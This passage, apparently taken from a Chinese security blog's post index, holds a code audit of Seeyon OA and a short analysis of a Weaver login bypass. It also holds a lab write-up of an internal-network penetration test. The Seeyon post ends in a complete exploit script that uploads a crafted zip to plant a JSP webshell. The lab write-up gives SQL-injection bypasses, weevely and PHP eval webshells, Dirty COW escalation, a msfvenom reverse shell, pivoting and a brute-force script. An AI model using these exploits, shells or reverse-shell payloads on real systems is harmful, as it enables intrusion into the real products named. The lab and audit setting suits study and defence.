oldElementStr.replaceAll(\"%(?![0-9a-fA-F]&#123;2&#125;)\", \"%25\");                  oldElementStr = URLDecoder.decode(oldElementStr, \"UTF-8\");               &#125; catch (UnsupportedEncodingException var35) &#123;                  oldElementStr = \"\";               &#125;               String[] oldElementArr = oldElementStr.split(\"@\");               String[] var30 = oldElementArr;               int var31 = oldElementArr.length;               for(int var32 = 0; var32 &lt; var31; ++var32) &#123;                  String string = var30[var32];                  String[] arr = string.split(\":\");                  oldElementMap.put(arr[0], arr[1]);               &#125;            &#125;            String ofdFileId = request.getParameter(\"ofdFileId\");            String subApp = request.getParameter(\"subApp\");            if (Strings.isNotBlank(ofdFileId)) &#123;               map.put(\"ofdFileId\", ofdFileId);               if (\"2\".equals(subApp)) &#123;                  Map metaDataMap = this.edocApi.getOfdMetaDataFromOfdFile(Long.parseLong(ofdFileId));                  if (null != metaDataMap) &#123;                     Iterator var47 = metaDataMap.keySet().iterator();                     while(var47.hasNext()) &#123;                        Object key = var47.next();                        oldElementMap.put(key.toString(), metaDataMap.get(key).toString());                     &#125;                  &#125;               &#125;            &#125;\n\n在374行调用了EdocApiImpl.java#getOfdMetaDataFromOfdFile\n\n\n\n\n\n\n\n在369行可以发现fileId外部可控。\n经过分析，执行到Map metaDataMap = this.edocApi.getOfdMetaDataFromOfdFile(Long.parseLong(ofdFileId));需要满足几个条件。\n\nisNew参数值不能为Null和false\nsubApp只能等于2\n\n继续回溯可发现调用到com/seeyon/ctp/common/content/mainbody/MainbodyController.java的路由/content/content.do\n\n\n\n\n\n\n\n熟悉致远的朋友应该都知道，通过路由调用MainbodyController类的invokingForm方法时，只需要在指定method参数为invokingForm即可\n如\nhttp://xx.xx.xx.xx/seeyon/content/content.do?method=invokingForm\n\n到这里，我们一条漏洞利用的路线就走通了，\n\n请求http://xx.xx.xx.xx/seeyon/content/content.do?method=invokingForm\n传入zip的fileId、isNew=ture、subApp=2。\n\n\n调用this.edocApi.getOfdMetaDataFromOfdFile(Long.parseLong(ofdFileId));\n调用this.govdocGBManager.getOfdMetadata(ofdFileId);\n调用this.getOfdMetadata(fileId, file, true, (Map)null);\n调用OfdJavaZipUtil.unzip(sourceFilePath, unzipFilePath, charsetMap);\n控制fos = new FileOutputStream(path + zn.getName());中的zn.getName()为../../../../ApacheJetspeed/webapps/ROOT/mzr.jspx实现在任意文件写入。\n\n到目前为止，我们距离getshell只完成了一半，接下来，我们还需要制作一个特殊的zip文件，并且找到一个可以上传zip，并且获得该文件得fileId的功能点。\nzip制作\n主要问题是在操作系统无法使用/作为文件名使用，所以，这里通过制作一个携带webshell的压缩包，通过010 editor修改文件名即可。（需要修改两处）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n接下来，最最重要的，就是需要找到一个上传zip的地方。\n那么要怎么找呢？\n在com/seeyon/apps/govdoc/gb/manager/impl/GovdocGBManagerImpl.java#getOfdMetadata方法中\n\n\n\n\n\n\n\n通过fileId获取文件，那么是否也可以保存文件呢？\n在FileManager.java接口中\n\n\n\n\n\n\n\n可以发现是有save接口的\n接下来全局搜索fileManager.save，还挺多\n\n\n\n\n\n\n\n在com/seeyon/ctp/rest/resources/EditContentResource.java#saveFile()方法中\n public Response saveFile() throws BusinessException &#123;     Map&lt;String, Object&gt; map = new HashMap();     Date today = new Date();     Long fileId = Long.valueOf(this.request.getParameter(\"fileId\"));     String _createDate = this.request.getParameter(\"createDate\");     Date createDate = Datetimes.parse(_createDate);     String notJinge2StandardOffice = this.request.getParameter(\"notJinge2StandardOffice\");     String type = this.request.getParameter(\"type\");     try &#123;         CommonsMultipartResolver resolver = (CommonsMultipartResolver)AppContext.getBean(\"multipartResolver\");         HttpServletRequest req = resolver.resolveMultipart(this.request);         MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)req;         Iterator&lt;String&gt; fileNames = multipartRequest.getFileNames();         if (fileNames == null) &#123;             map.put(\"error_msg\", ResourceUtil.getString(\"common.content.fileName.blank\"));             return this.ok(map);         &#125;         while(fileNames.hasNext()) &#123;             Object name = fileNames.next();             if (name != null &amp;&amp; !\"\".equals(name)) &#123;                 MultipartFile file = multipartRequest.getFile(String.valueOf(name));                 String bakOldPath = this.fileManager.getFolder(createDate, true) + File.separator + fileId;                 String filePath = this.fileManager.getFolder(today, true) + File.separator + fileId;                 this.bakPhysicalFile(filePath, bakOldPath, fileId, today);                 String tempFile = SystemEnvironment.getSystemTempFolder() + File.separator + UUIDLong.absLongUUID();                 boolean isSuccessSave = false;                 isSuccessSave = this.saveTempFile(tempFile, file);                 if (!\"true\".equals(notJinge2StandardOffice) &amp;&amp; \"collaboration\".equals(type)) &#123;                     boolean toJingge = Util.jinge2StandardOffice(tempFile, tempFile);                     if (isSuccessSave &amp;&amp; !toJingge) &#123;                         LOGGER.error(\"office正文转为标准office的时候失败,toJingge:\" + toJingge);                     &#125;                     isSuccessSave = toJingge;                 &#125;                 try &#123;                     CoderFactory.getInstance().encryptFile(tempFile, filePath);                 &#125; catch (Exception var30) &#123;                     LOGGER.error(\"filePath=\" + filePath);                     LOGGER.error(\"CoderFactory.getInstance() Exception:\", var30);                 &#125;                 if (isSuccessSave) &#123;                     V3XFile v3xfile = this.fileManager.getV3XFile(fileId);                     Integer category = Integer.valueOf(this.request.getParameter(\"category\"));                     this.officeTransManager.clean(fileId, Datetimes.format(today, \"yyyyMMdd\"));                     boolean isNew = false;                     String realFileType;                     if (null == v3xfile) &#123;                         v3xfile = new V3XFile();                         isNew = true;                         v3xfile.setId(fileId);                         v3xfile.setCategory(category);                         v3xfile.setFilename(fileId.toString());                         v3xfile.setSize(file.getSize());                         realFileType = this.request.getParameter(\"fileType\");                         String mimeType = \"msoffice\";                         if (\".docx\".equals(realFileType)) &#123;                             mimeType = \"application/vnd.openxmlformats-officedocument.wordprocessingml.document\";                         &#125; else if (\".doc\".equals(realFileType)) &#123;                             mimeType = \"application/msword\";                         &#125; else if (\".xls\".equals(realFileType)) &#123;                             mimeType = \"application/vnd.ms-excel\";                         &#125; else if (\".xlsx\".equals(realFileType)) &#123;                             mimeType = \"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\";                         &#125;                         v3xfile.setMimeType(mimeType);                     &#125;                     realFileType = Datetimes.format(new Date(System.currentTimeMillis()), \"yyyy-MM-dd HH:mm:ss\");                     v3xfile.setUpdateDate(Datetimes.parseDate(realFileType));                     User user = AppContext.getCurrentUser();                     if (user != null) &#123;                         v3xfile.setCreateMember(user.getId());                         v3xfile.setAccountId(user.getAccountId());                     &#125;                     v3xfile.setCreateDate(today);                     v3xfile.setUpdateDate(today);                     if (!isNew) &#123;                         this.fileManager.update(v3xfile);                     &#125; else &#123;                         this.fileManager.save(v3xfile);                     &#125;...\n\nsaveFile方法中从request请求中获取了fileId、createDate、notJinge2StandardOffice等参数\n\n\n\n\n\n\n\n84-103行从reques请求中获取了上传的文件，并通过调用this.saveTempFile(tempFile, file)将上传的文件保存在Seeyon/A8/base/temporary/路径下\n\n\n\n\n\n\n\n121行会先通过fileId去查找V3XFile对象，如果没有则重新创建，再设置fileId、category等属性值。\n\n\n\n\n\n\n\n最后161行调用了this.fileManager.save(v3xfile);\n\n\n\n\n\n\n\n通过该接口即可上传我们的zip文件，并且fileId是我们可以控制的。\n请求该接口的路径为\nhttp://xx.xx.xx.xx/seeyon/rest/editContent/saveFile\n\n漏洞利用漏洞利用脚本\nimport requestsimport base64host = \"http://172.20.10.22\"headers = &#123;    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\",    \"Cookie\": \"JSESSIONID=ECA7A2CD059B38DE39A3DEFAB4E365C4\"&#125;# ../../../../ApacheJetspeed/webapps/ROOT/mzr.jspx 文件路径# zip文件内容base64编码# UEsDBBQAAAAIANu5XVHzGO9FtgIAAOkFAAAwAAAALi4vLi4vLi4vLi4vQXBhY2hlSmV0c3BlZWQvd2ViYXBwcy9ST09UL216ci5qc3B4rVTfT9swEH4Gif/By5ODOrcDCoySSpQVaRvb0EqfEA+Oc20NqZPZTtcI9X/fOU5YKC9MWtRK5/Pd990v3/mDyc90llmyXqbKnOExChbW5mfd7gNfcWYKxUS27H6Z3HRv+BwCsgJtZKai4AM7CIYVQCI1CCtXwHI0IXKZZ9pGQQVQWJmy/U4ly6yW1kzoMrevjiYH0RinXM3ZftAd7u16EhAp19wiN6pQNoZMCawtqMSQS3e+zngCmjzt7e5MaVsjwkq5Y4ocNBXhAA8b/OdFnErhncmcxqWFu3sS19YabKEVqZxYAjOpoLKkcYf0OiRmKai5XTRo+Dvvvo60Ct4ILXObgkWF1WUFP7Faqjl5hDIKPvZ6sTg97Scn/f7h4Uk/GPgAfhVgLDNgLyxax4UFGpjHMug4t3DQgkm45VHjMAf7E1zmNGQahWsMnXpzOSPU2b6LiCrStE61QcHmkohMSmNh6VBudIbJ25L6Zta9DzzUTl0vkSUQOTCnJfXneNDcDU/ONdxmFAfmNAjJMCI9z0pan2/BiBs4PiKRP7JZpr/zJdDWJHkLH0Db/0f8gCNIPoELxuXgDV0O38AusoQGKNbXWD4/Hnf3oa8Ck2qVPQL1Xnjt8Z7vt+kcDJLUExM2vI7Oj0jYZk6qW2RV8JvUxE/elVWDvHkOoAbypk0QT65hDnCEPoYG09ur91jKzYuwNgRSA/9YWPe8l9IINrqYjI+Pava3lxej/KyM5UoA/S9FGhWzGeitUvnhfHuptgpTzeqlzBduE7gaVKLjfo49uBhPmqkWSCAtPfDAExC4B75COcHdRPHV/e1D2CHer3Z05lNqF9JspdhaRTREDRUsya6k4il1KYThyzoyfMU8NdQt08tMWdxxnsFlshHcigUdrwXkbsMQCLHlm0GzfNqbxmvceh/+AVBLAQIfABQAAAAIANu5XVHzGO9FtgIAAOkFAAAwACQAAAAAAAAAIAAAAAAAAAAuLi8uLi8uLi8uLi9BcGFjaGVKZXRzcGVlZC93ZWJhcHBzL1JPT1QvbXpyLmpzcHgKACAAAAAAAAEAGAAAKyVBBq7WAfv0tPzSyNkBzgG+GmrI2QFQSwUGAAAAAAEAAQCCAAAABAMAAAAA # 上传特殊构造的zip文件file_content  = \"UEsDBBQAAAAIANu5XVHzGO9FtgIAAOkFAAAwAAAALi4vLi4vLi4vLi4vQXBhY2hlSmV0c3BlZWQvd2ViYXBwcy9ST09UL216ci5qc3B4rVTfT9swEH4Gif/By5ODOrcDCoySSpQVaRvb0EqfEA+Oc20NqZPZTtcI9X/fOU5YKC9MWtRK5/Pd990v3/mDyc90llmyXqbKnOExChbW5mfd7gNfcWYKxUS27H6Z3HRv+BwCsgJtZKai4AM7CIYVQCI1CCtXwHI0IXKZZ9pGQQVQWJmy/U4ly6yW1kzoMrevjiYH0RinXM3ZftAd7u16EhAp19wiN6pQNoZMCawtqMSQS3e+zngCmjzt7e5MaVsjwkq5Y4ocNBXhAA8b/OdFnErhncmcxqWFu3sS19YabKEVqZxYAjOpoLKkcYf0OiRmKai5XTRo+Dvvvo60Ct4ILXObgkWF1WUFP7Faqjl5hDIKPvZ6sTg97Scn/f7h4Uk/GPgAfhVgLDNgLyxax4UFGpjHMug4t3DQgkm45VHjMAf7E1zmNGQahWsMnXpzOSPU2b6LiCrStE61QcHmkohMSmNh6VBudIbJ25L6Zta9DzzUTl0vkSUQOTCnJfXneNDcDU/ONdxmFAfmNAjJMCI9z0pan2/BiBs4PiKRP7JZpr/zJdDWJHkLH0Db/0f8gCNIPoELxuXgDV0O38AusoQGKNbXWD4/Hnf3oa8Ck2qVPQL1Xnjt8Z7vt+kcDJLUExM2vI7Oj0jYZk6qW2RV8JvUxE/elVWDvHkOoAbypk0QT65hDnCEPoYG09ur91jKzYuwNgRSA/9YWPe8l9IINrqYjI+Pava3lxej/KyM5UoA/S9FGhWzGeitUvnhfHuptgpTzeqlzBduE7gaVKLjfo49uBhPmqkWSCAtPfDAExC4B75COcHdRPHV/e1D2CHer3Z05lNqF9JspdhaRTREDRUsya6k4il1KYThyzoyfMU8NdQt08tMWdxxnsFlshHcigUdrwXkbsMQCLHlm0GzfNqbxmvceh/+AVBLAQIfABQAAAAIANu5XVHzGO9FtgIAAOkFAAAwACQAAAAAAAAAIAAAAAAAAAAuLi8uLi8uLi8uLi9BcGFjaGVKZXRzcGVlZC93ZWJhcHBzL1JPT1QvbXpyLmpzcHgKACAAAAAAAAEAGAAAKyVBBq7WAfv0tPzSyNkBzgG+GmrI2QFQSwUGAAAAAAEAAQCCAAAABAMAAAAA\"res = requests.post(url=host+\"/seeyon/rest/editContent/saveFile?fileId=9095842667142857911&amp;category=1\", headers=headers, files=&#123;\"file\": base64.b64decode(file_content)&#125;)# print(res.text)# 解压文件RCErequests.get(url=host+\"/seeyon/content/content.do?method=invokingForm&amp;subApp=2&amp;ofdFileId=9095842667142857911&amp;isNew=true\",headers=headers)# print(res.text)# 验证if(requests.get(url=host+\"/mzr.jspx\").status_code == 200):    print(\"[+] 上传成功 \")    print(\"[+] 利用路径  %s/mzr.jspx 密码: sky\"%(host))else:    print(\"[-] 利用失败\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"泛微VerifyGDLogin.jsp前台任意用户登录漏洞分析","url":"/2024/01/05/%E6%B3%9B%E5%BE%AEVerifyGDLogin.jsp%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"漏洞接口/login/VerifyGDLogin.jsp\n\n从request中接收两个参数para1和para2，分别对应url和userid，然后调用PoppupRemindInfoUtil.decrypt(userid)对其进行解密。然后会将解密后的userid作为参数调用VerifyGDLogin.getUserCheck方法。\n\n\n\n\n\n\n\nPoppupRemindInfoUtil.decrypt方法默认是通过读取AESpassword.properties配置文件中的pwd字段的值对userid进行AES进行解密。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ngetUserCheck方法会通过userid在HrmResource或HrmResourceManager表中获取该用户信息，并将信息赋值给User对象，最后在93行设置到session中。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n最后只需要知道AESpassword.properties配置文件中的pwd密钥，使用密钥通过AES加密userid，即可通过该接口实现任意用户登录。\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"记一次内网渗透测试实训总结","url":"/2022/06/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/","content":"前言时间很快就来到了学期的最后一个月，和上学期一样，最后的几周是实训周，而这次实训恰好就是我比较喜欢的网络攻防，因为之前学过相关的知识，做过一些靶场，相比于其他同学做起来要快些，不过内网渗透也还是头一次，得益于这次的内网渗透靶场环境，小小地体验了一下，期间也踩了许多坑，也陆陆续续地解决掉了。所以就以本篇文章做个总结，目的在于梳理所学到地知识点和分享。\n环境&amp;工具物理机 (win 10) ip：172.20.10.1\n工具：蚁剑、火狐（hackbar插件）\n攻击机（kali） ip：172.20.10.129\n工具：MSF框架、Burpsuite、冰蝎、weevely、Nmap、Proxychains4 …\n靶场拓扑图\n\n\n\n\n\n\n\n渗透过程准备首先需要拿到一个入口地址\n在FW中查看\n\n\n\n\n\n\n\n这个是Web服务器的外网地址 10.100.1.104，直接访问是访问不到的，需要使用老师给的vpn。\n这里直接在kali中配置vpn，\n\n\n\n\n\n\n\n得到一个10.200.0.77地址。（这里得到的地址会经常变，后面操作的时候可能会不一致）\n渗透测试web服务器刚刚通过查看FW防火墙的配置拿到了web服务器的地址10.100.1.104\n信息收集端口扫描\nnmap -sT 10.100.1.104 -sV# sT tcp三次握手扫描(默认为sT)# sV 扫描服务的版本信息\n\n\n\n\n\n\n\n\n开放了80端口，web服务器是用Apache 2.2.15，操作系统为Centos\nweb渗透测试登录处存在万能密码 or 1=1 #绕过\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功进入到后台管理界面\n在用户管理-&gt;头像编辑处存在文件上传绕过检测漏洞\n\n\n\n\n\n\n\n使用kali自带的weevely工具生成php后门\nweevely generate 123456 backdoor.php\n\n\n\n\n\n\n\n\n进行上传\n\n\n\n\n\n\n\n\n\n\n\n\n\n在头像处找到后门的上传地址\n\n\n\n\n\n\n\n\n\n\n连接php后门\nweevely http://10.100.1.104/avatar/admin.php 123456\n\n\n\n\n\n\n\n\n已经成功拿到一个webshell权限\n漏洞分析sql注入漏洞分析\n刚刚是用sql注入进入的后台，burp抓包发现是请求的login.php文件，接下来对该文件进行分析。\n# 省略了无关紧要的代码&lt;?phpif (isset($_POST['submit'])) &#123;  include 'config/dbconnect.php';  // Get input  $email = $_POST['email'];  $password = md5($_POST['password']);  // Check database  $query = \"SELECT username, isadmin FROM users WHERE email = '$email' and password = '$password';\";  $result = mysqli_query($conn, $query);  $num = @mysqli_num_rows($result); // The '@' character suppresses errors  if ($num &gt; 0) &#123;    // Feedback for end user    while ($row = mysqli_fetch_assoc($result)) &#123;      $_SESSION['logged'] = true;      $_SESSION['username'] = $row[\"username\"];      if ($row[\"isadmin\"] == 1) &#123;        $_SESSION['isadmin'] = true;      &#125; else &#123;        $_SESSION['isadmin'] = false;      &#125;      header(\"Location: http://\" . $_SERVER['HTTP_HOST'] . \"/admin.php?page=dashboard\");    &#125;  &#125; else &#123;    // Feedback for end user    $_SESSION['logged'] = false;    echo \"&lt;script&gt;$('#login-alert').removeClass('d-none')&lt;/script&gt;\";  &#125;  mysqli_close($conn);&#125;?&gt;\n\n全局变量POST接收了email和password，登录的sql语句为\n$query = \"SELECT username, isadmin FROM users WHERE email = '$email' and password = '$password';\";\n\n可以发现没怎么过滤，传入的密码进行md5加密，我们在email处构造的万能密码admin&#39;or 1=1 #，拼接到sql语句中为\n$query = \"SELECT username, isadmin FROM users WHERE email = 'admin'or 1=1 #' and password = '$password';\";\n\nsql语句中#为注释符，这里真正执行的sql语句为\nSELECT username, isadmin FROM users WHERE email = 'admin'or 1=1；\n\n&#39;admin&#39; or 1=1 这个where条件，会查询出所有的用户名。\n查询得记录值不少于1条就会进入if语句，进而执行$_SESSION[&#39;logged&#39;] = true;。\nif ($num &gt; 0) &#123;    // Feedback for end user    while ($row = mysqli_fetch_assoc($result)) &#123;      $_SESSION['logged'] = true;      $_SESSION['username'] = $row[\"username\"];      if ($row[\"isadmin\"] == 1) &#123;        $_SESSION['isadmin'] = true;      &#125; else &#123;        $_SESSION['isadmin'] = false;      &#125;      header(\"Location: http://\" . $_SERVER['HTTP_HOST'] . \"/admin.php?page=dashboard\");    &#125;  &#125; else &#123;    // Feedback for end user    $_SESSION['logged'] = false;    echo \"&lt;script&gt;$('#login-alert').removeClass('d-none')&lt;/script&gt;\";  &#125;\n\n而后访问admin.php，只会对$_SESSION[&#39;logged&#39;]进行验证。所以成功登录了后台。\n&lt;?phpsession_start();if (!(isset($_SESSION['logged']) &amp;&amp; $_SESSION['logged'])) &#123;  header(\"Location: http://\" . $_SERVER['HTTP_HOST'] . \"/login.php\");&#125;?&gt;\n\n文件上传漏洞分析\n后面是使用了文件上传漏洞绕过文件类型检测上传了php木马。通过burp发现，最终请求了users.php文件\n关键代码逻辑如下\nif (isset($_POST['submit'])) &#123;  if (isset($_FILES[\"file\"])) &#123;    // 获取文件后缀名    $tmp = explode(\".\", $_FILES[\"file\"][\"name\"]);    $extension = end($tmp);    if ((($_FILES[\"file\"][\"type\"] == \"image/png\"))      &amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800)   // 小于 200 kb    ) &#123;      if ($_FILES[\"file\"][\"error\"] &gt; 0) &#123;        echo \"错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br&gt;\";      &#125; else &#123;        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"avatar/\" . \"admin\" . \".\" . $extension)) &#123;          echo \"头像上传成功\";        &#125; else &#123;          echo \"头像上传失败\";        &#125;      &#125;    &#125; else &#123;      echo \"只能上传png格式且小于200KB\";    &#125;  &#125;&#125;\n\n最关键的验证代码为\nif ((($_FILES[\"file\"][\"type\"] == \"image/png\"))     &amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800)   // 小于 200 kb   )\n\n这里只对文件的类型和文件大小进行了验证，并没有对后缀名进行验证。所以这里将Content-Type: image/png 进行绕过即可上传。\n提权我们已经拿到了一个权限为apache的shell，接下来将权限提升到root。\n首先查看该Linux的内核版本\nuname -a\n\n\n\n\n\n\n\n\n使用kali中的searchsploit工具搜索版本号为2.6 相关的提权漏洞，Linux中最出名的一个提权漏洞，影响范围Linux kernel &gt;= 2.6.22，直接搜关键字dirty.\nsearchsploit 2.6 | grep -i &quot;dirty&quot;\n\n\n\n\n\n\n\n\n拷贝到当前路径下\nsearchsploit -m 40839 .\n\n接下来通过weevely工具将40839.c文件上传到web服务器的/tmp路径下\n:file_upload /home/kali/40839.c /tmp/40839.c\n\n\n\n\n\n\n\n\n在40839.c文件中可以找到编译该这个脚本的方式\ngcc -pthread 40839.c -o dirty -lcrypt\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n赋予执行权限&amp;执行\nchmod +x dirty./dirty 123456\n\n\n\n\n\n\n\n\n已经执行了但是没有回显，直接Ctrl+C断掉中断，再重连，通过查看cat /etc/passwd看看是否替换掉了root用户\n\n\n\n\n\n\n\n发现已经成功变成了firefart用户，说明已经提权成功。\nssh连接查看flag因为防火墙的只放行了80端口，不能直接通过远程主机的22端口进行ssh连接，所以我们需要用msf做一个端口转发，将web服务器的22端口转发到本地的2222端口。\n接下来使用msfvenom生成一个linux后面文件\nmsfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.200.0.47 lport=9876 -f elf &gt; shell9876\n\n\n\n\n\n\n\n\n通过weevely将后门文件shell9876上传至web靶机的/tmp目录下\n:file_upload /home/kali/shell9876 /tmp/shell\n\n\n\n\n\n\n\n\n接下来打开msfconsole进行监听\nuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcp set lhost 0.0.0.0set lport 9876run\n\n\n\n\n\n\n\n\n回到weevely界面中，赋予shell执行权限并执行\nchmod +x shell&amp;./shell\n\n\n\n\n\n\n\n\n回到msfconsole终端下\n\n\n\n\n\n\n\n已经成功反弹（这里仔细看的话会发现反弹ip地址不对，是因为ip地址临时变了一次）\n接下来将web服务器的22端口转发到本地的2222端口\nportfwd add -l 2222 -r 127.0.0.1 -p 22\n\n\n\n\n\n\n\n\n接下来直接ssh连接127.0.0.1,端口为 2222，密码为123456\nssh firefart@127.0.0.1 -p 2222\n\n\n\n\n\n\n\n\n成功拿下\n注意：如果要返回到从meterpreter返回到模块配置界面输入background,会返回一个session号，这个在后面配置路由的时候会用到。\n\n\n\n\n\n\n\n内网横向移动内网横向移动可以通过msf添加路由用msf自带模块扫C段，或者配置socks5代理服务，配置proxychains4用nmap来扫。这里根据分析http请求日志来拿到内网网段。\n查看日志日志目录\n/var/log/httpd\n\n在access_log-20211018日志文件中发现一个网段192.168.223.0\n\n\n\n\n\n\n\n接下来通过 socks5代理的方式，用nmap探测192.168.223.0存活的主机。\n配置路由在msf中配置路由\nroute add 192.168.223.0 255.255.255.0 1\n\n\n\n\n\n\n\n\n开启socks5代理服务使用use auxiliary/server/socks_proxy模块开启sockes5代理服务。\n\n\n\n\n\n\n\n查看1080端口是否开启\nnetstat -lnt\n\n\n\n\n\n\n\n\n配置proxychains4接下来使用proxychains4工具来进行我们的socks5代理，使用这个工具前需要对其配置文件进行配置\n配置文件路径/etc/proxychains4.conf，在其末尾添加socks服务的ip 和端口\nsudo vim /etc/proxychains4.conf\n\n\n\n\n\n\n\n\nNamp探测网段主机存活proxychains4 nmap -sn 192.168.223.0/24# sP ping扫描# sn ping探测扫描主机,不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）\n\n\n\n\n\n\n\n\n注意：这里有个小坑，用proxychains4代理工具+nmap 进行扫描，扫描出来的ip全都是存活的，在网上没有找到解决这个问题的资料，但也不妨碍继续渗透，可以在proxychains转发日志中发现那些ip是真正存活的。\n\n\n\n\n\n\n\n通过nmap主机发现得到了192.168.223.1和192.168.223.3两个ip地址，接下来对223.1进行渗透测试。\n内网渗透：OA系统信息收集端口扫描\nproxychains4 nmap -sT 192.168.223.1 -sV\n\n\n\n\n\n\n\n\n目标主机开放了22、80端口，发现web服务器为nginx1.18.0 ，操作系统为Ubuntu。接下对web服务进行渗透测试。\nweb渗透测试注意：使用kali中的浏览器对192.168.223.1进行访问，需要对浏览器配置socks5代理。\n\n\n\n\n\n\n\n使用kali中的firefox火狐浏览器，我直接使用foxyProxy插件配置代理，方便切换。\n\n\n\n\n\n\n\n配置的socks5代理\n\n\n\n\n\n\n\n密码爆破一个登录界面\n\n\n\n\n\n\n\n输个123456,登录。\n\n\n\n\n\n\n\n提示密码为5位数，10000-99999之间，需要对登录界面进行爆破。两种方式，一个是使用burp里的intruder模块进行爆破，二是自己写爆破脚本。\n第一种方式：使用burp里的intruder模块进行爆破\n注意 ：需要给浏览器配置socks5代理才能访问192.168.223.1,但是想要使用burp进行抓包，需要浏览器配置burp的代理，如果配置了burp的代理就不能访问了192.168.223.1，所以我们需要对burp进行配置一个前置代理。也就是给火狐配置burp的代理，给burp配置内网socks5代理。\n在burp suite-&gt;User options模块下配置\n\n\n\n\n\n\n\n\n\n\n接下来，burp抓取登录包，send to intruder\n\n\n\n\n\n\n\n配置Positions\n\n\n\n\n\n\n\n配置Payloads\n\n\n\n\n\n\n\n开始爆破\n注意：kali里的burp suite为社区版，猜测是做了限制，跑起来非常得慢，可以在物理机上使用破解后的burp进行爆破，会快很多，或者自己编写python脚本进行爆破。\n爆破成功的截图\n\n\n\n\n\n\n\n第二种方式：自己编写Python爆破脚本\nimport requestsimport queue,threadingimport time,sysflag = 0  # 0代表 未找到 1 代表找到def getPwd():    q = queue.Queue()    for i in range(10000, 99999):        q.put(i)    return qdef exp(pwd):    global flag    url = \"http://192.168.223.1/login.php\" # 这里为靶机的IP，都一致，不用修改    # 配置代理    proxies = &#123;        \"http\": \"socks5://172.20.10.129:1080\" # 1. 这里自己的socks5代理地址    &#125;    headers = &#123;        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\",    &#125;    datas = &#123;        \"username\": \"admin\",        \"password\": pwd,        \"logintype\": 0,        \"adminmobile\": \"\",        \"adminmobileyzm\": \"\",        \"submit\": \"%E7%99%BB%E5%BD%95\",    &#125;    try:        print(\"[*] passwd:%s\"%(pwd))        resp = requests.post(url=url, data=datas, headers=headers, proxies=proxies)        if \"用户名或密码错误，密码是5为数字\" not in resp.text:            print(\"[+] username:%s passwd:%s\"%(datas[\"username\"], pwd))            flag = 1    except:        print(\"[-] 请求故障 检查网络或者代理\")        time.sleep(2)if __name__=='__main__':    # 拿到 5位数所有密码    q = getPwd()    # 创建线程池    threads = []    # 输出队列    while not q.empty():        # 创建多线程并启动多线程        for i in range(20): # 2. 这里可以设置线程的大小 默认为20 可以根据电脑配置自行设置            thread = threading.Thread(target=exp, args=(q.get(),), name='thread')            threads.append(thread)            thread.start()        # 设置堵塞        for thread in threads:            thread.join()        # 找到停止        if flag == 1:            time.sleep(2)            import sys            sys.exit()\n\n注意：需要在脚本的第20行修改为自己的socks代理，线程默认为20，可改可不改\n\n\n\n\n\n\n\n结果\n\n\n\n\n\n\n\n拿到密码后，接下来登录后台\n存在两个漏洞，可以在头像修改处发现文件上传漏洞，但是上传的文件没有执行权限，在后台页面的存在文件包含漏洞。\n文件上传+文件包含getshell文件上传可以上传，但是对上传路径是没有访问权限。\n\n\n\n\n\n\n\n测试文件包含漏洞\nhttp://192.168.223.1/?page=../../../../../etc/passwd\n\n\n\n\n\n\n\n\n成功包含出/etc/passwd\n上传图片马，我的图片马文件内容为\n文件名：shell.php.png\nGIF89a&lt;?php eval($_POST['shell']);?&gt;\n\n不需要抓包，直接将后缀改成png格式，直接上传。在头像出找到头像的路径。\n\n\n\n\n\n\n\n接下来，对该文件进行包含\n\n\n\n\n\n\n\n传参进行测试，（我kali中的firefox的hackbar不太听使唤，这里我直接在win10上对firefox配置kali的socks5代理进行测试）\n\n\n\n\n\n\n\n成功执行了phpinfo();函数。\n命令执行写马我直接通过win10下的蚁剑进行连接，但是一直报错\n注意：蚁剑也需要配socks5代理\n\n\n\n\n\n\n\n可以执行命令，但是却连接不上，接下来通过命令执行在网站根目录写一句话木马\necho &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d &gt;3.php# &lt;?php eval($_POST[&apos;shell&apos;]);?&gt;\n\nhttp://192.168.223.1/?page=./avatar/admin.png# postshell=system(&apos;echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d 